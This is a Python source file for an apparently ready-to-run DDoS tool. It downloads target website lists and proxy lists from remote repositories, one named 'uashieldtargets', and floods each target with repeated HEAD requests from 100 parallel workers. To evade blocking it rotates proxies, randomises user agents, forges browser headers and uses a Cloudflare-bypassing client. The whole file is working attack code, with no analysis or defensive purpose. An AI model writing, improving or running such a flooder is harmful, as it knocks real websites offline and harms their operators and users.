#!/usr/bin/env python3
import asyncio
import time
import aiohttp
import json
import requests
import threading
import random

from asyncio import Queue, sleep
from sys import stderr
from loguru import logger
from urllib3 import disable_warnings

from threading import Thread
from aiocfscrape import CloudflareScraper
from pyuseragents import random as random_useragent

PARALLEL_COUNT = 100
MAX_REQUESTS_TO_SITE = 200
MAX_FAIL_COUNT = 3
READ_TIMEOUT = 10
RELOAD_TARGETS_TIMEOUT = 10 #minutes
RANDOM_PROXY_COUNT = 10

SITES_HOSTS = ["https://gitlab.com/jacobean_jerboa/sample/-/raw/main/sample",
               "https://raw.githubusercontent.com/opengs/uashieldtargets/v2/sites.json"]

DEFAULT_PROXIES_HOSTS = [
    "https://raw.githubusercontent.com/opengs/uashieldtargets/v2/proxy.json"
]


class RequestCounter():
    def __init__(self):        
        self._count_no_responce = 0
        self._count_alive = 0
        self._total = 0
        self._read_lock = asyncio.Lock()
        self._lastupdate = time.time()

    async def incrementNoResponse(self):
        async with self._read_lock:
            self._count_no_responce += 1
            self._total += 1

    async def incrementAlive(self):
        async with self._read_lock:
            self._count_alive += 1           
            self._total += 1  

    def _reset(self):
        self._count_no_responce = 0
        self._count_alive = 0

    async def printStats(self):
        async with self._read_lock:
            if time.time() >= self._lastupdate + 60:
                self._lastupdate = time.time()
                logger.info(f'Total: {self._total}, rpm {self._count_no_responce+self._count_alive}, Success: {self._count_alive},  Fail:{self._count_no_responce}')
                self._reset()


class WorkItem:
    def __init__(self ,url:str, proxy:str = None, request:int = 0, fail:int = 0):
        self.url = url
        self.proxy = proxy
        self.request_count = request
        self.fail_count = fail


class JsonLoader:
    def __init__(self,infinity:bool = False):
        self._isInfinity = infinity
        self._list = []
        self._index = 0
        self._count = 0
        self._lock = threading.Lock()


    def loadFile(self, file_name: str, data_path: str):
        with open(file_name, 'r') as file:
            self._list = [
                        proxy_data[data_path]
                        for proxy_data in json.load(file)
                    ]
            self._count = len(self._list)

    def getNext(self):
        with self._lock:
            if self._index ==  self._count:
                if self._isInfinity:
                    self._index = 0
                else:
                    return None
            data = self._list[self._index]
            self._index += 1
            if not data.startswith('http'):
                data = 'https://' + data
            return data

    def loadHosts(self,hosts:list):
            tmp = set()
            for link in hosts:
                while True:
                    try:
                        data = requests.get(link, timeout=5).json()
                        break
                    except:
                        logger.info(f'error load {link} ')
                        time.sleep(3)
                        continue
                for page in data:
                    tmp.add(page["page"])
            self._list = list(tmp)
            self._count = len(self._list)
            logger.info(f'loaded {self._count} hosts')    

    def loadProxy(self,hosts:list):
        tmp = set()
        for link in hosts:
            while True:
                try:
                    data = requests.get(link, timeout=5).json()
                    break
                except:
                    logger.info(f'error load {link} ')
                    time.sleep(3)
                    continue
            for page in data:
                tmp.add(f'{page["scheme"]}://{page["ip"]}')

        self._list = random.sample( list(tmp),RANDOM_PROXY_COUNT)                
        self._count = len(self._list)
        logger.info(f'loaded {self._count} proxies')


    def getAll(self):
        return self._list

    def count(self):
        return self._count
 

#  = = = = = = = = = = =  = = = = = = = = = = = = = = = = =

TIMEOUT = aiohttp.ClientTimeout(
    total=10,
    connect=10,
    sock_read=10,
    sock_connect=10,
)


HEADERS_TEMPLATE = {
    'Content-Type': 'text/html;',
    'Connection': 'keep-alive',
    'Accept-Language': 'ru-RU, ru;q=0.9, en-US;q=0.8, en;q=0.7, fr;q=0.6',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Charset': 'utf-8, iso-8859-1;q=0.5, *;q=0.1',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 

    'cache-control': 'max-age=0', 
	'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"', 
	'sec-ch-ua-mobile': '?0', 
	'upgrade-insecure-requests': '1', 
	'sec-fetch-site': 'none', 
	'sec-fetch-mode': 'navigate', 
	'sec-fetch-user': '?1', 
	'sec-fetch-dest': 'document'
}

sites = JsonLoader(True)
proxies = JsonLoader()
rcounter = RequestCounter()
 
 #  = = = = = = = = = = =  = = = = = = = = = = = = = = = = =

lastupdate = 0

def updateResources():
    global lastupdate
    if time.time() > lastupdate + 60 * RELOAD_TARGETS_TIMEOUT:
        lastupdate = time.time()
        sites.loadHosts(SITES_HOSTS)
        proxies.loadProxy(DEFAULT_PROXIES_HOSTS)

def _get_headers() -> dict:
    headers = HEADERS_TEMPLATE.copy()
    headers['User-Agent'] = random_useragent()
    return headers



 
async def worker(worker_id: int,sem: asyncio.Semaphore):
    async with CloudflareScraper(timeout=TIMEOUT, trust_env=True) as session:
        while True:    
            url = sites.getNext()
            await asyncio.sleep(0)
            if url:
                work_item = WorkItem(url)
                proxy_index = 0

                while (work_item.request_count<MAX_REQUESTS_TO_SITE) or (work_item.fail_count < MAX_FAIL_COUNT):
                    async with sem:
                        status = -1
                        headers = _get_headers()
                        try:
                            async with session.head(work_item.url, proxy=work_item.proxy,headers=headers, verify_ssl=False) as response:
                                status = response.status
                        except Exception as e:
                            # logger.debug(f'Error processing url {work_item.url} - {e}')
                            pass
                        
                        work_item.request_count += 1

                        if (200 <= status < 302):
                            # logger.warning(f'[{worker_id}]  {work_item.url} - {status}, proxy: {work_item.proxy} ({work_item.request_count})')
                            work_item.fail_count = 0
                            await rcounter.incrementAlive()
                        else: # error 400-500 are not generate a lot of data, so ignore it
                            work_item.fail_count += 1
                            await rcounter.incrementNoResponse()
                            # logger.debug(f'[{worker_id}] {work_item.url} - {status}, proxy: {work_item.proxy} ({work_item.request_count})')
                            
                            if proxy_index < proxies.count():
                                proxy_list = proxies.getAll()
                                work_item.proxy = proxy_list[proxy_index]
                                proxy_index += 1
                        await asyncio.sleep(0)


async def timer():
    while True:
        updateResources()
        await rcounter.printStats()
        await sleep(1)

def timer_loop():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(timer())
    loop.close()

    
def main():
    Thread(target=timer_loop, daemon=True).start()
    updateResources()

    sem = asyncio.Semaphore(1000) # do not CHANGE!

    loop = asyncio.get_event_loop()
    union = asyncio.gather(*[
        worker(i,sem)
        for i in range(PARALLEL_COUNT)
    ])
    loop.run_until_complete(union)


if __name__ == '__main__':
    logger.remove()
    logger.add(
        stderr,
        format='<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> | <cyan>{line}</cyan> - <white>{message}</white>'
    )
    main()
